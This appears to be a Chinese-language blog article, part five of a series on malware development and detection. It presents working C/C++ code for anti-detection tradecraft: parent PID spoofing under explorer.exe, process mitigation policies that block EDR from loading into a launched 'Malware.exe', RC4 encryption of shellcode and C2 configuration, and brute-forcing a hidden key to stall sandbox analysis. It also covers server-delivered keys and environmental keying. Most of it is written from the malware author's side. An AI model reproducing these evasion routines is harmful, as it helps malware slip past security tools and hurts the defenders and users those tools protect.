介绍



这是《恶意软件的开发与检测》系列的第五篇文章。在之前的文章中，我们探讨了检测虚拟机、沙盒、调试和静态分析的方法。

02

父进程PID欺骗



这是一种基于父子进程关系绕过恶意行为检测的方法。通常，当应用程序启动另一个可执行文件时，会为新进程分配一个父PID，父PID指示创建它的进程。这可以检测和阻止恶意意图，例如Word/Excel应用程序启动Powershell。该技术可以和进程镂空结合，实现更高的隐蔽性。


CreateProcess API可以在创建流程时提供其他信息，包括PROC_THREAD_ATTRIBUTE_PARENT_PROCESS。先创建一个Powershell进程，让它看起来像是由explorer.exe生成的：


DWORD runningProcessesIDs[1024];DWORD runningProcessesCountBytes;DWORD runningProcessesCount;HANDLE hExplorerexe = NULL;
EnumProcesses(runningProcessesIDs, sizeof(runningProcessesIDs), &runningProcessesCountBytes);runningProcessesCount = runningProcessesCountBytes / sizeof(DWORD);
for (int i = 0; i < runningProcessesCount; i++){    if (runningProcessesIDs[i] != 0)    {        HANDLE hProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, runningProcessesIDs[i]);        char processName[MAX_PATH + 1];        GetModuleFileNameExA(hProcess, 0, processName, MAX_PATH);        _strlwr(processName);        if (strstr(processName, "explorer.exe") && hProcess)        {            hExplorerexe = hProcess;        }    }}
STARTUPINFOEXA si;PROCESS_INFORMATION pi;SIZE_T attributeSize;RtlZeroMemory(&si, sizeof(STARTUPINFOEXA));RtlZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)new byte[attributeSize]();InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hExplorerexe, sizeof(HANDLE), NULL, NULL);si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
bool s = CreateProcessA("C:\\Windows\\notepad.exe", NULL, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);

进程保护



Adam Chester（_xpn_）讲了两个有趣的功能，可用来阻止EDR调试执行动态代码分析：


  • 阻止第三方二进制文件加载到进程中：PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON

  • 使用ACG保护机制阻止可执行文件内存页面的操作：PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON


_xpn_对此进行了详细的解释，来看一些示例代码：


STARTUPINFOEXA si;PROCESS_INFORMATION pi;SIZE_T attributeSize;RtlZeroMemory(&si, sizeof(STARTUPINFOEXA));RtlZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)new byte[attributeSize]();InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON | PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON;UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(HANDLE), NULL, NULL);si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
bool s = CreateProcessA("Malware.exe", NULL, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);


还可以使用SetProcessMitigationPolicy API函数为现有进程设置策略。


但有潜在的问题——如果我们设置动态代码禁止，目标进程将无法分配可执行的内存。

用编码或加密进行高级数据混淆



在前面的文章中，我简要提到了用XOR“加密”或Base64编码进行字符串和数据混淆。用未在二进制文件中进行硬编码的密钥对数据进行加密，将其提升到一个新的水平。


我们可以使用Bcrypt Windows库（不要与bcrypt哈希函数混淆），该库包含许多加密算法的实现。我们还可以实现自己的加密，比如用RC4函数：


void RC4(PCHAR key, PCHAR input, PCHAR output, DWORD length) //same function for encryption and decryption{    unsigned char S[256];    int len = strlen(key);    int j = 0;    unsigned char tmp;    for (int i = 0; i < 256; i++)        S[i] = i;    for (int i = 0; i < 256; i++) {        j = (j + S[i] + ((PUCHAR)key)[i % len]) % 256;        tmp = S[i];        S[i] = S[j];        S[j] = tmp;    }    int i = 0;    j = 0;    for (int n = 0; n < length; n++) {        i = (i + 1) % 256;        j = (j + S[i]) % 256;        tmp = S[i];        S[i] = S[j];        S[j] = tmp;        int rnd = S[(S[i] + S[j]) % 256];        ((PUCHAR)output)[n] = rnd ^ ((PUCHAR)input)[n];    }}

暴力破解



我们可以用随机密钥把任何数据（字符串，shellcode，C2配置等）加密后再放入应用程序，并要求应用程序暴力破解密钥，这会加大分析的难度。


在应用程序启动时破解加密密钥需要花费一些时间（这取决于密钥长度），并且可能会使沙盒执行的动态分析超时。


请参阅示例递归函数，该函数可破解字母数字键（最多15个字符）：


unsigned int djb2Hash(const char* data, DWORD dataLength){    DWORD hash = 9876;
    for (int i = 0; i < dataLength; i++)    {        hash = ((hash << 5) + hash) + ((PBYTE)data)[i];    }
    return hash;}
PCHAR RecursiveCrack(PCHAR encryptedData, int encryptedDataLength, PCHAR key, int level){    char keySpace[] = "\x00""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";    PCHAR decryptedData = new char[encryptedDataLength + 1]();    for (int i = 0; i < sizeof(keySpace) - 1; i++)    {        if (level == 16)        {            if (!i) i++;            key[16 - level] = keySpace[i];            RC4(key, encryptedData, decryptedData, encryptedDataLength);            if (djb2Hash(decryptedData, encryptedDataLength) == hardcodedHash) return key;            if (i == sizeof(keySpace) - 2) return NULL;        }        else        {            key[16 - level] = keySpace[i];            if (RecursiveCrack(encryptedData, encryptedDataLength, key, level + 1) != NULL) return key;            else continue;        }    }    delete[] decryptedData;    return NULL;}
PCHAR CrackKey(PCHAR encryptedData, int encryptedDataLength){
    PCHAR key = new char[16]();    RecursiveCrack(encryptedData, encryptedDataLength, key, 1);    return key;}


把解密数据的哈希值和预先计算的硬编码哈希值比较，再进行密钥验证。





06

耗时的运算



我们不暴力破解密钥，而是执行任何耗时间的数学计算，这种计算在一般的台式计算机上只需要几秒钟的时间，且可以给出一些意想不到的值。例如：大质数分解（尝试破坏RSA加密），对某些数据进行十亿次哈希处理。

密钥交付



我们的恶意应用程序无需在运行时计算密钥，可以直接从服务器中检索它。我们可以基于DNS，HTTP或任何其他合适的协议来实现密钥托管。进一步讲，我们可以根据信标发送的用户代理或cookie提供密钥，但这又是另一个主题了。


下面是一个HTTP GET请求的示例：

环境检测



这有点类似于基于用户名，域名等的沙盒规避。但这是针对特定组织和有有效载荷的人员，要确保不会在错误的机器上执行。特定的环境特征（如提到的AD域名）可用于条件语句和数据解密。实际上，这被归类为“ MITRE ATT＆CK”技术（请参阅https://attack.mitre.org/techniques/T1480/001/）。


所以，要把基于环境的沙盒规避和通过加密/编码进行混淆结合起来。另外，我们可以在不使用Windows API的情况下获取环境变量 —— 可以直接从PEB检索数据。下图是x64进程环境块：
